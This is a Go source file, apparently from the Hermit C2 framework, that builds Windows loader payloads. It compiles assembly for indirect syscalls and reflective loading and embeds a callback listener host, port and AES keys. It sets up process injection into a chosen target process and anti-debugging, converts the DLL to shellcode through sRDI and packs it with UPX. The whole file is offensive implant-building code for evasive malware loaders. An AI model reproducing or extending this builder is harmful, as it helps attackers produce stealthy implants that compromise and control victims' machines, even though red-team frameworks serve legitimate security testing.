package payload

import (
	"fmt"
	"os"
	"slices"
	"strings"

	"github.com/google/uuid"
	"github.com/hideckies/hermit/pkg/common/crypt"
	"github.com/hideckies/hermit/pkg/common/meta"
	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
	"github.com/hideckies/hermit/pkg/common/stdout"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/listener"
	utilsSRDI "github.com/hideckies/hermit/pkg/server/payload/utils"
	"github.com/hideckies/hermit/pkg/server/state"
)

type Loader struct {
	Id               uint
	Uuid             string
	Name             string
	Os               string
	Arch             string
	Format           string
	Lprotocol        string
	Lhost            string
	Lport            uint16
	Type             string
	PayloadToLoad    string
	Technique        string
	ProcessToInject  string
	IndirectSyscalls bool
	AntiDebug        bool
	CompLevel        uint64
}

func NewLoader(
	id uint,
	_uuid string,
	name string,
	os string,
	arch string,
	format string,
	lprotocol string,
	lhost string,
	lport uint16,
	ldrType string,
	payloadToLoad string,
	technique string,
	processToInject string,
	indirectSyscalls bool,
	antiDebug bool,
	compLevel uint64,
) *Loader {
	if _uuid == "" {
		_uuid = uuid.NewString()
	}
	if name == "" {
		name = utils.GenerateRandomAnimalName(false, ldrType)
	}

	return &Loader{
		Id:               id,
		Uuid:             _uuid,
		Name:             name,
		Os:               os,
		Arch:             arch,
		Format:           format,
		Lprotocol:        lprotocol,
		Lhost:            lhost,
		Lport:            lport,
		Type:             ldrType,
		PayloadToLoad:    payloadToLoad,
		Technique:        technique,
		ProcessToInject:  processToInject,
		IndirectSyscalls: indirectSyscalls,
		AntiDebug:        antiDebug,
		CompLevel:        compLevel,
	}
}

func (l *Loader) Generate(serverState *state.ServerState) (data []byte, outFile string, err error) {
	// Get the correspoiding listener
	liss, err := serverState.DB.ListenerGetAll()
	if err != nil {
		return nil, "", err
	}
	var lis *listener.Listener = nil
	for _, _lis := range liss {
		if _lis.Protocol == l.Lprotocol && (_lis.Addr == l.Lhost || slices.Contains(_lis.Domains, l.Lhost)) && _lis.Port == l.Lport {
			lis = _lis
			break
		}
	}
	if lis == nil {
		return nil, "", fmt.Errorf("the corresponding listener not found")
	}

	// Get output path
	payloadsDir, err := metafs.GetListenerPayloadsDir(lis.Name, false)
	if err != nil {
		return nil, "", err
	}
	outFile = fmt.Sprintf("%s/%s.%s.%s", payloadsDir, l.Name, l.Arch, l.Format)

	// Get request path
	requestPathDownload := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/loader/download"])

	// Generate random AES key and IV
	newAES, err := crypt.NewAES()
	if err != nil {
		return nil, "", err
	}

	// Change to the paylaod directory
	if l.Os == "linux" {
		return nil, "", fmt.Errorf("linux target is not implemented yet")
	} else if l.Os == "windows" {
		// Change directory
		os.Chdir("./payload/win/loader")
		_, err = meta.ExecCommand("rm", "-rf", "build")
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", err
		}

		// Compile assembly and generate an object file.
		asmSysObj := fmt.Sprintf("/tmp/syscalls-%s.o", uuid.NewString())
		asmRflObj := fmt.Sprintf("/tmp/rfl-%s.o", uuid.NewString())
		asmSysSrc := "src/asm/syscalls."
		asmRflSrc := "src/asm/rfl."
		asmFmt := "win"

		if l.Arch == "amd64" {
			asmSysSrc += "x64.asm"
			asmRflSrc += "x64.asm"
			asmFmt += "64"
		} else {
			asmSysSrc += "x86.asm"
			asmRflSrc += "x86.asm"
			asmFmt += "32"
		}

		_, err = meta.ExecCommand("nasm", "-f", asmFmt, "-o", asmSysObj, asmSysSrc)
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", fmt.Errorf("nasm error: %v", err)
		}
		_, err = meta.ExecCommand("nasm", "-f", asmFmt, "-o", asmRflObj, asmRflSrc)
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", fmt.Errorf("nasm error: %v", err)
		}

		// Compile
		outText, err := meta.ExecCommand(
			"cmake",
			fmt.Sprintf("-DASM_OBJ_SYSCALLS=%s", asmSysObj),
			fmt.Sprintf("-DASM_OBJ_REFLECTIVE=%s", asmRflObj),
			fmt.Sprintf("-DOUTPUT_DIRECTORY=%s", payloadsDir),
			fmt.Sprintf("-DPAYLOAD_NAME=%s", l.Name),
			fmt.Sprintf("-DPAYLOAD_ARCH=%s", l.Arch),
			fmt.Sprintf("-DPAYLOAD_FORMAT=%s", l.Format),
			fmt.Sprintf("-DPAYLOAD_TYPE=\"%s\"", l.Type),
			fmt.Sprintf("-DPAYLOAD_TO_LOAD=\"%s\"", l.PayloadToLoad),
			fmt.Sprintf("-DPAYLOAD_TECHNIQUE=\"%s\"", l.Technique),
			fmt.Sprintf("-DPAYLOAD_PROCESS_TO_INJECT=\"%s\"", l.ProcessToInject),
			fmt.Sprintf("-DPAYLOAD_INDIRECT_SYSCALLS=%t", l.IndirectSyscalls),
			fmt.Sprintf("-DPAYLOAD_ANTI_DEBUG=%t", l.AntiDebug),
			fmt.Sprintf("-DLISTENER_PROTOCOL=\"%s\"", l.Lprotocol),
			fmt.Sprintf("-DLISTENER_HOST=\"%s\"", l.Lhost),
			fmt.Sprintf("-DLISTENER_PORT=%s", fmt.Sprint(l.Lport)),
			fmt.Sprintf("-DREQUEST_PATH_DOWNLOAD=\"%s\"", requestPathDownload),
			fmt.Sprintf("-DAES_KEY_BASE64=\"%s\"", newAES.Key.Base64),
			fmt.Sprintf("-DAES_IV_BASE64=\"%s\"", newAES.IV.Base64),
			"-S.",
			"-Bbuild",
		)
		if err != nil {
			os.Chdir(serverState.CWD)
			os.Remove(asmSysObj)
			os.Remove(asmRflObj)
			return nil, "", fmt.Errorf("create build directory error: %v", err)
		}
		if strings.Contains(strings.ToLower(outText), "error:") {
			os.Chdir(serverState.CWD)
			os.Remove(asmSysObj)
			os.Remove(asmRflObj)
			return nil, "", fmt.Errorf("cmake error: %s", outText)
		}

		outText, err = meta.ExecCommand(
			"cmake",
			"--build", "build",
			"--config", "Release",
			"-j", fmt.Sprint(serverState.NumCPU),
		)
		if err != nil {
			os.Chdir(serverState.CWD)
			os.Remove(asmSysObj)
			os.Remove(asmRflObj)
			return nil, "", fmt.Errorf("build error: %v", err)
		}
		if strings.Contains(strings.ToLower(outText), "error:") {
			os.Chdir(serverState.CWD)
			os.Remove(asmSysObj)
			os.Remove(asmRflObj)
			return nil, "", fmt.Errorf("cmake error: %s", outText)
		}

		os.Remove(asmSysObj)
		os.Remove(asmRflObj)

		// sRDI ------------------------------------------------------------------------------
		// If the format is '.bin', convert DLL to shellcode
		if strings.HasSuffix(outFile, ".bin") {
			dllFile := strings.Replace(outFile, ".bin", ".dll", -1)

			_, err := utilsSRDI.GenerateSRDIShellcode(dllFile, "Start")
			if err != nil {
				// Remove .dll file
				removeErr := os.Remove(dllFile)
				if removeErr != nil {
					stdout.LogFailed(fmt.Sprintf("Error: %s", removeErr))
				}
				return nil, "", fmt.Errorf("sRDI Error: %v", err)
			}

			// Remove .dll file
			removeErr := os.Remove(dllFile)
			if removeErr != nil {
				stdout.LogFailed(fmt.Sprintf("Error: %s", removeErr))
			}
		}
		// ---------------------------------------------------------------------------------------
	} else {
		return nil, "", fmt.Errorf("target is not recognized")
	}

	// Compress the file with UPX
	if l.CompLevel > 0 {
		outText, err := meta.ExecCommand(
			"upx",
			fmt.Sprintf("-%d", l.CompLevel),
			outFile,
		)
		if err != nil {
			return nil, "", fmt.Errorf("upx error: %v", err)
		}
		if strings.Contains(strings.ToLower(outText), "error:") {
			return nil, "", fmt.Errorf("upx error: %s", outText)
		}
	}

	data, err = os.ReadFile(outFile)
	if err != nil {
		os.Chdir(serverState.CWD)
		return nil, "", err
	}

	// Go back to the current directory
	os.Chdir(serverState.CWD)

	return data, outFile, nil
}
